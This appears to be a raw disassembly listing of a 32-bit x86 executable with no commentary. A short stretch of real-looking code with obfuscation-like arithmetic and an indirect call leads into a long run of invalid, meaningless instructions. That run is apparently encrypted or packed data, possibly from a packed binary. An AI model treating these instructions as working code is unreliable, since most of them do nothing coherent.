  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a244
  40a251:	and    cl,cl
  40a253:	and    dl,al
  40a255:	add    eax,0x5f4e7c7c
  40a25a:	jl     0x40a2d8
  40a25c:	dec    edx
  40a25d:	dec    esi
  40a25e:	mov    al,BYTE PTR [ebx+ebx*1]
  40a261:	popa   
  40a262:	pop    edi
  40a263:	inc    ebp
  40a264:	loope  0x40a2d0
  40a266:	neg    DWORD PTR [esi]
  40a268:	inc    BYTE PTR [ebx]
  40a26a:	mov    ch,0xb8
  40a26c:	inc    edx
  40a26d:	xchg   esp,eax
  40a26e:	add    al,0x64
  40a270:	adc    bl,BYTE PTR [edx+0x784f4f8a]
  40a276:	inc    edx
  40a277:	test   ah,al
  40a279:	(bad)  
  40a27a:	fstp   DWORD PTR [esi]
  40a27c:	mov    bh,0xf1
  40a27e:	or     BYTE PTR [esi],bl
  40a280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a281:	loopne 0x40a208
  40a283:	shr    DWORD PTR [edi+0x5d],cl
  40a286:	xchg   esp,eax
  40a287:	sub    ebx,DWORD PTR [edx+ebx*2+0x6f]
  40a28b:	and    esi,DWORD PTR [ebp-0xc]
  40a28e:	dec    esp
  40a28f:	ins    DWORD PTR es:[edi],dx
  40a290:	xchg   esp,eax
  40a291:	test   al,0x43
  40a293:	aas    
  40a294:	fst    QWORD PTR [esi-0x76322cfa]
  40a29a:	mov    dh,BYTE PTR [edi+ebx*1-0x2f7e5ad7]
  40a2a1:	inc    esi
  40a2a2:	pushf  
  40a2a3:	inc    eax
  40a2a4:	jmp    0x6489:0x3fbf21a3
  40a2ab:	sbb    BYTE PTR [esp+eiz*4-0x30600660],dl
  40a2b2:	mov    gs,WORD PTR [esi-0x51]
  40a2b5:	or     dl,dh
  40a2b7:	inc    edi
  40a2b8:	jge    0x40a276
  40a2ba:	sbb    BYTE PTR [edx-0x16f46b27],bl
  40a2c0:	pop    ebx
  40a2c1:	cmp    DWORD PTR [esp+eiz*4+0x570d27de],ebx
  40a2c8:	cwde   
  40a2c9:	sti    
  40a2ca:	add    DWORD PTR [ecx-0x1],ebp
  40a2cd:	xchg   esp,eax
  40a2ce:	sbb    al,0x20
  40a2d0:	in     eax,dx
  40a2d1:	outs   dx,BYTE PTR ds:[esi]
  40a2d2:	loope  0x40a27b
  40a2d4:	enter  0xe6b2,0xe7
  40a2d8:	adc    BYTE PTR [ecx-0x77],ch
  40a2db:	mov    ch,0xbb
  40a2dd:	ins    DWORD PTR es:[edi],dx
  40a2de:	loopne 0x40a311
  40a2e0:	stos   BYTE PTR es:[edi],al
  40a2e1:	jmp    0xd52d409f
  40a2e6:	mov    edi,0xcf1f1e26
  40a2eb:	push   ebp
  40a2ec:	sbb    DWORD PTR [edi-0x15],edx
  40a2ef:	fnstsw WORD PTR [edx+ebx*4]
  40a2f2:	dec    esi
  40a2f3:	dec    eax
  40a2f4:	pop    ss
  40a2f5:	cmp    eax,0xfb34d36d
  40a2fa:	jnp    0x40a2c4
  40a2fc:	fwait
  40a2fd:	ret    0x6775
  40a300:	shr    ch,0xcc
  40a303:	nop
  40a304:	mov    dh,0x6e
  40a306:	xchg   ebx,eax
  40a307:	or     ebp,DWORD PTR [edi+ebp*2-0x33]
  40a30b:	push   cs
  40a30c:	inc    ecx
  40a30d:	xor    ch,al
  40a30f:	and    DWORD PTR [ecx-0x54],ebp
  40a312:	les    edi,FWORD PTR [ebx+0x1]
  40a315:	adc    dh,BYTE PTR [ebx-0x29307c18]
  40a31b:	push   ecx
  40a31c:	loop   0x40a362
  40a31e:	mov    bh,0xbd
  40a320:	out    dx,al
  40a321:	jle    0x40a2cb
  40a323:	mov    edi,0x8ec4f710
  40a328:	add    BYTE PTR [esi],0x95
  40a32b:	(bad)  
  40a32c:	xchg   edx,eax
  40a32d:	mov    ebx,ecx
  40a32f:	push   es
  40a330:	or     DWORD PTR [ecx+ebp*4-0x14],ecx
  40a334:	gs jmp 0xabf6737d
  40a33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a33b:	push   ecx
  40a33c:	or     BYTE PTR [ebp+0x3ad0bc9f],bl
  40a342:	and    al,0x8f
  40a344:	hlt    
  40a345:	sub    edi,DWORD PTR [ecx-0x71]
  40a348:	rcr    edi,cl
  40a34a:	in     al,dx
  40a34b:	cmc    
  40a34c:	jmp    0xad3851ac
  40a351:	or     DWORD PTR [edi],eax
  40a353:	test   al,0x24
  40a355:	arpl   WORD PTR [ecx],si
  40a357:	clts   
  40a359:	inc    edi
  40a35a:	or     al,0x2d
  40a35c:	repz arpl ax,dx
  40a35f:	daa    
  40a360:	adc    ebp,esp
  40a362:	xchg   edi,edi
  40a364:	loop   0x40a38f
  40a366:	call   0x1117:0x4e2b5bf
  40a36d:	fxch   st(6)
  40a36f:	xchg   ebp,eax
  40a370:	xor    bh,al
  40a372:	dec    edi
  40a373:	jns    0x40a381
  40a375:	aam    0xf7
  40a377:	sbb    al,0x10
  40a379:	jns    0x40a325
  40a37b:	pop    ebp
  40a37c:	mov    dl,0xe7
  40a37e:	jne    0x40a31f
  40a380:	xchg   ecx,eax
  40a381:	jno    0x40a32a
  40a383:	and    eax,0x821cfc6f
  40a388:	(bad)  
  40a389:	in     al,dx
  40a38a:	sahf   
  40a38b:	dec    eax
  40a38c:	mov    WORD PTR [ebp+0x69],gs
  40a38f:	jecxz  0x40a382
  40a391:	loopne 0x40a3c4
  40a393:	stos   DWORD PTR es:[edi],eax
  40a394:	mov    al,0xd9
  40a396:	test   cl,0xc8
  40a399:	bound  esi,QWORD PTR [eax+ebp*4-0x336422f5]
  40a3a0:	xchg   edx,eax
  40a3a1:	out    dx,al
  40a3a2:	sub    dh,cl
  40a3a4:	pop    esi
  40a3a5:	push   ebp
  40a3a6:	in     eax,dx
  40a3a7:	(bad)  
  40a3a8:	lods   eax,DWORD PTR ds:[esi]
  40a3a9:	jmp    FWORD PTR [ebp+0x30]
  40a3ac:	inc    edi
  40a3ad:	outs   dx,DWORD PTR ds:[esi]
  40a3ae:	jecxz  0x40a38b
  40a3b0:	sub    eax,DWORD PTR [ebp+0x22ab17c2]
  40a3b6:	cmc    
  40a3b7:	dec    eax
  40a3b8:	mov    ch,0x57
  40a3ba:	test   edx,esp
  40a3bc:	test   DWORD PTR [eax-0x39],0xc7c9220d
  40a3c3:	pop    edx
  40a3c4:	adc    ebx,DWORD PTR [edi-0x4]
  40a3c7:	fwait
  40a3c8:	xchg   BYTE PTR [ebx+0xa],ah
  40a3cb:	push   edi
  40a3cc:	aaa    
  40a3cd:	add    DWORD PTR [edi+edi*8-0x7c631cd7],ebx
  40a3d4:	mov    ebx,0x4285f5e2
  40a3d9:	or     al,0x4a
  40a3db:	sbb    al,0xa4
  40a3dd:	ret    0xf1b0
  40a3e0:	cwde   
  40a3e1:	bound  esp,QWORD PTR [ebx]
  40a3e3:	push   edi
  40a3e4:	mov    ecx,0x1d29e17
  40a3e9:	cli    
  40a3ea:	jbe    0x40a3e9
  40a3ec:	xor    eax,0x759c0186
  40a3f1:	jp     0x40a3e5
  40a3f3:	jns    0x40a3c2
  40a3f5:	or     ah,BYTE PTR [ebp-0x50]
  40a3f8:	adc    BYTE PTR [edi],0x12
  40a3fb:	adc    DWORD PTR [esi-0x2d],esi
  40a3fe:	cdq    
  40a3ff:	dec    edx
  40a400:	jbe    0x40a3ce
  40a402:	xor    esp,ebx
  40a404:	adc    BYTE PTR [edx],0x32
  40a407:	cwde   
  40a408:	cmp    ebx,DWORD PTR [eax]
  40a40a:	test   DWORD PTR [edi-0x56816011],esi
  40a410:	push   DWORD PTR [ebp-0x11]
  40a413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a414:	xchg   esp,eax
  40a415:	cmp    edx,DWORD PTR [edi-0x5]
  40a418:	mov    bl,0x70
  40a41a:	in     al,0x5c
  40a41c:	xor    dl,bh
  40a41e:	dec    esp
  40a41f:	ret    0x45d9
  40a422:	sub    al,0x8d
  40a424:	or     DWORD PTR [ebx-0xe],eax
  40a427:	dec    ecx
  40a428:	mov    edi,0x86327ade
  40a42d:	call   0xb983:0xcf0576de
  40a434:	mov    dh,0x10
  40a436:	call   0xbd7f3f4
  40a43b:	sbb    al,0x34
  40a43d:	push   eax
  40a43e:	lds    ecx,FWORD PTR [edi-0x7fe0cc01]
  40a444:	dec    ebp
  40a445:	push   0xd17396d
  40a44a:	or     BYTE PTR [eax],bl
  40a44c:	mov    esp,DWORD PTR [ebx+0x66]
  40a44f:	ja     0x40a4ab
  40a451:	inc    ecx
  40a452:	pop    ss
  40a453:	dec    ebp
  40a454:	or     eax,DWORD PTR [edx+0x35]
  40a457:	pop    edi
  40a458:	mov    ah,0xba
  40a45a:	adc    BYTE PTR [esi-0x7c7594db],al
  40a460:	outs   dx,DWORD PTR ds:[esi]
  40a461:	sbb    esi,DWORD PTR [edi-0x2a]
  40a464:	xchg   ecx,eax
  40a465:	xchg   edi,eax
  40a466:	bound  edi,QWORD PTR [ecx-0x76]
  40a469:	je     0x40a42a
  40a46b:	xlat   BYTE PTR ds:[ebx]
  40a46c:	or     bl,dl
  40a46e:	push   edx
  40a46f:	add    al,0x4e
  40a471:	scas   al,BYTE PTR es:[edi]
  40a472:	sub    DWORD PTR [ebx-0x67],0xffffffd9
  40a476:	and    BYTE PTR [edx-0x66],ch
  40a479:	sbb    dh,BYTE PTR [eax]
  40a47b:	gs (bad) 
  40a47d:	cmp    eax,0xb70e9b17
  40a482:	daa    
  40a483:	(bad)  
  40a484:	jmp    0x5a710cd7
  40a489:	xchg   DWORD PTR [ecx-0x35],edx
  40a48c:	and    BYTE PTR [ebp+0x69],cl
  40a48f:	enter  0xffbc,0xa8
  40a493:	inc    bx
  40a495:	xchg   ecx,eax
  40a496:	jge    0x40a4e7
  40a498:	cdq    
  40a499:	loope  0x40a4ea
  40a49b:	mov    bh,0x68
  40a49d:	sbb    esp,DWORD PTR [eax]
  40a49f:	or     al,0x67
  40a4a1:	add    al,0xf5
  40a4a3:	addr16 repz mov ch,0x6f
  40a4a7:	es xchg ecx,eax
  40a4a9:	xchg   DWORD PTR [ecx+0xca85eef],eax
  40a4af:	lds    edi,FWORD PTR [ebx-0x2b]
  40a4b2:	and    esi,DWORD PTR [edi]
  40a4b4:	aaa    
  40a4b5:	test   eax,0x9a2e6532
  40a4ba:	lds    edi,FWORD PTR [esi+0x6e5c9829]
  40a4c0:	push   ecx
  40a4c1:	sbb    eax,0x475510c7
  40a4c6:	mov    ah,0x8c
  40a4c8:	sub    ecx,DWORD PTR ds:0x3c73ac38
  40a4ce:	add    DWORD PTR [edi+0x4647a2de],edx
  40a4d4:	dec    ebx
  40a4d5:	gs mov al,0x84
  40a4d8:	mov    esi,0x3dca1fb4
  40a4dd:	cmc    
  40a4de:	gs inc ecx
  40a4e0:	xchg   ecx,eax
  40a4e1:	pop    esi
  40a4e2:	lahf   
  40a4e3:	xor    bh,dh
  40a4e5:	add    DWORD PTR [ebx+0x71],ecx
  40a4e8:	das    
  40a4e9:	inc    edi
  40a4ea:	sahf   
  40a4eb:	in     al,dx
  40a4ec:	mov    WORD PTR [ecx+0x5e35be80],?
  40a4f2:	lods   al,BYTE PTR ds:[esi]
  40a4f3:	int    0x7
  40a4f5:	jmp    0xb42f7ab8
  40a4fa:	mov    ebp,gs
  40a4fc:	dec    eax
  40a4fd:	rcl    edi,cl
  40a4ff:	test   eax,0xcc72c9f2
  40a504:	fsub   st,st(7)
  40a506:	leave  
  40a507:	add    al,0xd4
  40a509:	imul   ebx,DWORD PTR [ecx-0x7487a11f],0xffffffad
  40a510:	pop    esi
  40a511:	mov    cl,0x28
  40a513:	fistp  QWORD PTR [ebp-0x3639f62c]
  40a519:	loopne 0x40a4df
  40a51b:	pop    esp
  40a51c:	pop    ebx
  40a51d:	(bad)  [edx]
  40a51f:	xlat   BYTE PTR ds:[ebx]
  40a520:	leave  
  40a521:	cmp    eax,0x6954487e
  40a526:	loopne 0x40a550
  40a528:	std    
  40a529:	push   0x90e59d67
  40a52e:	fstp   DWORD PTR [ebp+0x37]
  40a531:	popa   
  40a532:	adc    BYTE PTR [ebx-0x5d9590fd],bh
  40a538:	mov    BYTE PTR [edx-0x57],dh
  40a53b:	stos   DWORD PTR es:[edi],eax
  40a53c:	dec    esi
  40a53d:	fisubr WORD PTR [esi]
  40a53f:	sar    DWORD PTR [esi-0x7e],cl
  40a542:	ds jg  0x40a4d6
  40a545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a546:	mov    eax,0x21603e93
  40a54b:	aam    0x11
  40a54d:	pop    ebp
  40a54e:	clc    
  40a54f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a550:	push   ds
  40a551:	mov    ebx,0x32b3f9d3
  40a556:	call   0xe519:0x1a7d4234
  40a55d:	mov    eax,0x27b0caa3
  40a562:	inc    edi
  40a563:	pop    ecx
  40a564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a565:	mov    WORD PTR ds:0xf78a41b9,?
  40a56b:	std    
  40a56c:	pop    DWORD PTR [ebp-0x1f187a28]
  40a572:	mov    dh,ch
  40a574:	or     BYTE PTR [ebp-0x13],dl
  40a577:	sub    DWORD PTR ds:0x6cd4bbb7,0x7
  40a57e:	push   esp
  40a57f:	cmp    DWORD PTR [edi],ebx
  40a581:	pop    esi
  40a582:	add    ch,BYTE PTR [esi+0x16]
  40a585:	adc    eax,esp
  40a587:	ja     0x40a557
  40a589:	push   ebp
  40a58a:	(bad)  
  40a58b:	dec    ecx
  40a58c:	addr16 push edi
  40a58e:	popw   es
  40a590:	mov    BYTE PTR [eax+0x348cb741],0x23
  40a597:	xor    al,cl
  40a599:	mul    ch
  40a59b:	(bad)  
  40a59c:	or     BYTE PTR [ebx],al
  40a59e:	xchg   esp,eax
  40a59f:	mov    cl,0xc5
  40a5a1:	cwde   
  40a5a2:	shr    DWORD PTR ds:0xb2c41bb0,cl
  40a5a8:	inc    esp
  40a5a9:	mov    esi,0xd3a2bbe1
  40a5ae:	fisub  DWORD PTR ds:0x8e27b2e2
  40a5b5:	add    al,BYTE PTR [edx-0x49]
  40a5b8:	push   ebp
  40a5b9:	bound  ebx,QWORD PTR [edi+0x77]
  40a5bc:	rdmsr  
  40a5be:	stc    
  40a5bf:	fdivr  QWORD PTR [ebx-0x3f]
  40a5c2:	fcomp  DWORD PTR [esi]
  40a5c4:	pop    ebx
  40a5c5:	ret    
  40a5c6:	shr    bh,cl
  40a5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c9:	ret    0x1dbe
  40a5cc:	and    al,0xe8
  40a5ce:	sbb    eax,0x9973cd49
  40a5d3:	lods   eax,DWORD PTR ds:[esi]
  40a5d4:	adc    eax,0x77994735
  40a5d9:	xchg   esp,eax
  40a5da:	call   0x8bae:0xa4674757
  40a5e1:	ret    0x78fc
  40a5e4:	adc    ebx,edi
  40a5e6:	popa   
  40a5e7:	jae    0x40a60a
  40a5e9:	dec    edi
  40a5ea:	push   ebp
  40a5eb:	inc    ecx
  40a5ec:	sub    BYTE PTR [edx],ah
  40a5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ef:	popf   
  40a5f0:	dec    edx
  40a5f1:	xchg   esp,eax
  40a5f2:	call   0xb0a0071d
  40a5f7:	mov    BYTE PTR [ebp-0x72],0xd5
  40a5fb:	aam    0xa
  40a5fd:	xchg   ebx,esi
  40a5ff:	adc    edi,DWORD PTR [ebp-0x41cae54a]
  40a605:	mov    al,0x97
  40a607:	jmp    0xa1828c72
  40a60c:	or     DWORD PTR [ecx],esp
  40a60e:	xor    bl,BYTE PTR [esi-0x19bc00e8]
  40a614:	out    dx,eax
  40a615:	add    DWORD PTR [edx+0x41591224],ebx
  40a61b:	push   cs
  40a61c:	sub    ch,BYTE PTR [edx]
  40a61e:	push   esi
  40a61f:	mov    dl,0x1e
  40a621:	ds ret 0x4d09
  40a625:	sub    bh,BYTE PTR [ebx+0x35]
  40a628:	ins    DWORD PTR es:[edi],dx
  40a629:	jno    0x40a5ea
  40a62b:	mov    es,ecx
  40a62d:	mov    edx,0x9c74cf09
  40a632:	jp     0x40a635
  40a634:	call   0x9656:0xcae4a2e9
  40a63b:	sti    
  40a63c:	mov    ebp,0x47f6ed92
  40a641:	add    edi,DWORD PTR [edi+ebp*8+0x52]
  40a645:	addr16 (bad) 
  40a648:	imul   esi,DWORD PTR [esi+0x70],0x12fa9343
  40a64f:	test   BYTE PTR ds:0xff26e021,bl
  40a655:	dec    edi
  40a656:	cli    
  40a657:	sbb    esp,DWORD PTR [edi+0x1d]
  40a65a:	sub    BYTE PTR [esi-0xd],bl
  40a65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65e:	outs   dx,DWORD PTR ds:[esi]
  40a65f:	pusha  
  40a660:	ins    DWORD PTR es:[edi],dx
  40a661:	cmp    edx,DWORD PTR [ebx]
  40a663:	mov    dl,cl
  40a665:	jge    0x40a60a
  40a667:	pushf  
  40a668:	cs stos DWORD PTR es:[edi],eax
  40a66a:	mov    ds:0xc53ebc48,al
  40a66f:	retf   
  40a670:	int3   
  40a671:	cdq    
  40a672:	fnsave [eax+0x59d85284]
  40a678:	cs leave 
  40a67a:	mov    edi,0x7424f15e
  40a67f:	pop    es
  40a680:	jns    0x40a671
  40a682:	mov    bl,0x2f
  40a684:	pusha  
  40a685:	dec    edx
  40a686:	dec    esp
  40a687:	mov    BYTE PTR [ecx-0x20862ff1],0xb2
  40a68e:	mov    edx,0x870780ef
  40a693:	xchg   ebp,eax
  40a694:	into   
  40a695:	inc    ebx
  40a696:	push   ecx
  40a697:	push   0xd5cae276
  40a69c:	sbb    dh,bl
  40a69e:	leave  
  40a69f:	arpl   WORD PTR ds:0xa6898e9d,bp
  40a6a5:	mov    edx,0xf2aa8a47
  40a6aa:	mov    esp,0x5a9a7e58
  40a6af:	push   ds
  40a6b0:	inc    edx
  40a6b1:	ret    
  40a6b2:	data16 jbe 0x40a65f
  40a6b5:	es or  eax,0xe0c20e29
  40a6bb:	mov    esi,0x832d4f88
  40a6c0:	cwde   
  40a6c1:	and    bl,BYTE PTR [ebx+0xa7f4b14]
  40a6c7:	inc    ebx
  40a6c8:	into   
  40a6c9:	ss mov cl,0xa0
  40a6cc:	pop    edi
  40a6cd:	cmc    
  40a6ce:	cmp    ecx,esi
  40a6d0:	xchg   esp,eax
  40a6d1:	lea    esp,[ecx+0x1a51e388]
  40a6d7:	xor    edx,DWORD PTR [edi+0x2a]
  40a6da:	daa    
  40a6db:	mov    gs,WORD PTR [eax+0x4b36cb7c]
  40a6e1:	jl     0x40a673
  40a6e3:	cld    
  40a6e4:	dec    ebx
  40a6e5:	jp     0x40a683
  40a6e7:	fs mov eax,0x882b3ee
  40a6ed:	out    0xe9,eax
  40a6ef:	int3   
  40a6f0:	fcmovb st,st(3)
  40a6f2:	shl    BYTE PTR [eax+0x61ce6d18],1
  40a6f8:	or     BYTE PTR [eax+0x0],0x5
  40a6fc:	pop    edx
  40a6fd:	mov    ebp,0x6e79158c
  40a702:	mov    cl,0xba
  40a704:	std    
  40a705:	ja     0x40a72d
  40a707:	popf   
  40a708:	dec    edx
  40a709:	call   0x9926:0x8cadcbac
  40a710:	fadd   QWORD PTR [eax-0x73]
  40a713:	xchg   DWORD PTR [esi+0x62b561c4],ecx
  40a719:	ds mov eax,0xe73aefc2
  40a71f:	call   0xf856:0xacad229d
  40a726:	adc    edx,DWORD PTR [ebx-0x11c626b1]
  40a72c:	and    BYTE PTR [edi-0x3a],0xfe
  40a730:	jl     0x40a730
  40a732:	outs   dx,BYTE PTR ds:[esi]
  40a733:	jg     0x40a752
  40a735:	mov    edi,DWORD PTR [esi]
  40a737:	imul   ebx,edi,0xffffffc3
  40a73a:	outs   dx,DWORD PTR ds:[esi]
  40a73b:	xlat   BYTE PTR ds:[ebx]
  40a73c:	push   ebp
  40a73d:	jecxz  0x40a7a4
  40a73f:	(bad)  
  40a741:	test   ch,al
  40a743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a744:	jl     0x40a6cf
  40a746:	cmp    BYTE PTR [edi],dl
  40a748:	cmp    ecx,DWORD PTR [ebx]
  40a74a:	or     dl,bl
  40a74c:	ffreep st(0)
  40a74e:	inc    edx
  40a74f:	add    DWORD PTR [esi-0x7],esp
  40a752:	into   
  40a753:	jno    0x40a7c4
  40a755:	mov    al,0xba
  40a757:	sub    bh,BYTE PTR [ebx+0x3c]
  40a75a:	call   0xf554:0x6ccea5cc
  40a761:	add    bh,BYTE PTR [eax]
  40a763:	dec    esp
  40a764:	xchg   esi,eax
  40a765:	sbb    edi,ebx
  40a767:	pushf  
  40a768:	popf   
  40a769:	stos   DWORD PTR es:[edi],eax
  40a76a:	jnp    0x40a7c7
  40a76c:	(bad)  
  40a76d:	mov    al,ds:0x47d204eb
  40a772:	xchg   ebx,eax
  40a773:	(bad)  
  40a775:	push   ebp
  40a776:	(bad)  
  40a777:	jmp    0x40a701
  40a779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a77a:	fadd   DWORD PTR [edx+0x57]
  40a77d:	cs inc ebp
  40a77f:	pop    edi
  40a780:	lahf   
  40a781:	inc    edx
  40a782:	enter  0x4c41,0x27
  40a786:	sub    eax,0xd04cb56b
  40a78b:	xor    BYTE PTR [edx-0x4e],ah
  40a78e:	int3   
  40a78f:	jae    0x40a7dd
  40a791:	mov    cx,0x872f
  40a795:	sbb    al,0xc7
  40a797:	mov    WORD PTR [ebx],gs
  40a799:	adc    DWORD PTR [eax],esi
  40a79b:	mov    bh,0x3e
  40a79d:	stc    
  40a79e:	aad    0x62
  40a7a0:	mov    ecx,0x6261fd98
  40a7a5:	push   edx
  40a7a6:	adc    al,0xe7
  40a7a8:	add    al,0x8
  40a7aa:	dec    esp
  40a7ab:	add    al,BYTE PTR [ebx+ebp*8-0xd]
  40a7af:	out    dx,eax
  40a7b0:	scas   eax,DWORD PTR es:[edi]
  40a7b1:	jge    0x40a7f6
  40a7b3:	pop    edx
  40a7b4:	jo     0x40a78d
  40a7b6:	xchg   ebp,eax
  40a7b7:	xor    BYTE PTR [esi+0x6af7ba40],ch
  40a7bd:	jmp    0x124f:0x2b24b139
  40a7c4:	mov    dl,dl
  40a7c6:	into   
  40a7c7:	mov    eax,DWORD PTR [esi+esi*2-0x46]
  40a7cb:	mov    eax,ds:0xe4dd228f
  40a7d0:	xor    ecx,DWORD PTR [ebx+eiz*1-0x14f14be1]
  40a7d7:	push   0x59d5cce1
  40a7dc:	dec    edi
  40a7dd:	daa    
  40a7de:	hlt    
  40a7df:	add    ax,0xd9f4
  40a7e3:	test   al,0x9a
  40a7e5:	gs aaa 
  40a7e7:	loopne 0x40a7e7
  40a7e9:	adc    al,0xfd
  40a7eb:	and    al,0xcb
  40a7ed:	xor    eax,0xb9388127
  40a7f2:	mov    dh,0x83
  40a7f4:	out    dx,eax
  40a7f5:	push   esp
  40a7f6:	sub    BYTE PTR [edx],bl
  40a7f8:	xchg   edx,eax
  40a7f9:	mov    ecx,0xdbe52c8f
  40a7fe:	mov    bh,0x8f
  40a800:	xchg   edi,eax
  40a801:	push   ss
  40a802:	pusha  
  40a803:	jne    0x40a79d
  40a805:	sub    eax,0x192acaa2
  40a80a:	jae    0x40a848
  40a80c:	out    dx,al
  40a80d:	mov    esi,fs
  40a80f:	cmp    eax,0x55ce0987
  40a814:	adc    edx,eax
  40a816:	mov    dh,0x7c
  40a818:	adc    eax,0xf94a421a
  40a81d:	nop
  40a81e:	std    
  40a81f:	push   ss
  40a820:	bound  eax,QWORD PTR [ebp+0x63d7f964]
  40a826:	pop    edx
  40a827:	jnp    0x40a860
  40a829:	stos   DWORD PTR es:[edi],eax
  40a82a:	popa   
  40a82b:	int3   
  40a82c:	mov    ds:0x37c704b,al
  40a831:	rcl    BYTE PTR [ebp+0xbc6bcb7],cl
  40a837:	dec    edi
  40a838:	jl     0x40a844
  40a83a:	jmp    0x719b6796
  40a83f:	fcmovu st,st(3)
  40a841:	rcl    DWORD PTR [edi-0x64b00774],1
  40a847:	std    
  40a848:	sub    ch,ch
  40a84a:	pop    ebp
  40a84b:	repz imul esi,DWORD PTR [edi+0x65],0x16
  40a850:	loopne 0x40a811
  40a852:	add    al,0xe3
  40a854:	sbb    BYTE PTR [edi+ecx*2+0x71],0x91
  40a859:	call   0xaf4fc5b7
  40a85e:	xchg   ecx,eax
  40a85f:	int3   
  40a860:	scas   eax,DWORD PTR es:[edi]
  40a861:	repnz mov bl,0x39
  40a864:	mov    al,ds:0xe8b93492
  40a869:	lods   al,BYTE PTR ds:[esi]
  40a86a:	clc    
  40a86b:	popw   ss
  40a86d:	and    esi,DWORD PTR [eax+0x4e]
  40a870:	inc    ebp
  40a871:	sub    BYTE PTR [esi],al
  40a873:	pop    ds
  40a874:	aad    0x3c
  40a876:	xchg   edi,eax
  40a877:	dec    esp
  40a878:	lods   eax,DWORD PTR ds:[esi]
  40a879:	popf   
  40a87a:	clc    
  40a87b:	inc    ecx
  40a87c:	inc    eax
  40a87d:	jae    0x40a81f
  40a87f:	fwait
  40a880:	movzx  edx,WORD PTR [ebp-0x3d0407ce]
  40a887:	lods   eax,DWORD PTR ds:[esi]
  40a888:	xchg   esi,eax
  40a889:	test   eax,0x13ffb1df
  40a88e:	xchg   esp,eax
  40a88f:	dec    ebp
  40a890:	in     al,0xc
  40a892:	aas    
  40a893:	out    dx,al
  40a894:	sub    eax,ebp
  40a896:	mov    ebx,0x72208f6b
  40a89b:	and    DWORD PTR [esi-0x599c2f6b],esp
  40a8a1:	mov    dh,0x5e
  40a8a3:	jle    0x40a908
  40a8a5:	add    eax,0x8207b46b
  40a8aa:	sti    
  40a8ab:	mov    bh,0xc3
  40a8ad:	cmc    
  40a8ae:	(bad)  
  40a8af:	fadd   DWORD PTR [ecx+0x68]
  40a8b2:	lods   eax,DWORD PTR ds:[esi]
  40a8b3:	pop    es
  40a8b4:	push   esp
  40a8b5:	(bad)  [edi+0x61]
  40a8b8:	shl    BYTE PTR [edx+0x6581729f],cl
  40a8be:	or     ecx,eax
  40a8c0:	xlat   BYTE PTR ds:[ebx]
  40a8c1:	push   esi
  40a8c2:	dec    ecx
  40a8c3:	data16 mov al,ds:0xfba8b3f3
  40a8c9:	inc    edi
  40a8ca:	xor    eax,0x25861ddd
  40a8cf:	add    eax,esp
  40a8d1:	leave  
  40a8d2:	iret   
  40a8d3:	hlt    
  40a8d4:	shl    DWORD PTR [esi],1
  40a8d6:	fbstp  TBYTE PTR [ebx+0x72fd81a9]
  40a8dc:	and    al,0x24
  40a8de:	inc    edi
  40a8df:	and    dl,0x48
  40a8e2:	jb     0x40a956
  40a8e4:	(bad)  
  40a8e6:	fld    st(6)
  40a8e8:	mov    dl,0xe6
  40a8ea:	sub    ch,ah
  40a8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ed:	xchg   ecx,ebx
  40a8ef:	dec    ecx
  40a8f0:	pushf  
  40a8f1:	pusha  
  40a8f2:	pop    ss
  40a8f3:	xchg   edi,eax
  40a8f4:	xor    DWORD PTR [ebp-0x462a0409],0xffffffe4
  40a8fb:	xor    dl,dl
